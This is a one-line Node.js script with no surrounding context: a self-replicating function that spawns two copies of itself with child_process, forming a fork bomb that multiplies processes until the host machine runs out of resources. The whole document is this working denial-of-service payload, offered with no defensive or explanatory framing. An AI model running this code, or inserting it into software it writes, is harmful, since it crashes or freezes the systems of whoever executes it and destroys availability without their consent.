(function f() { require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); }());
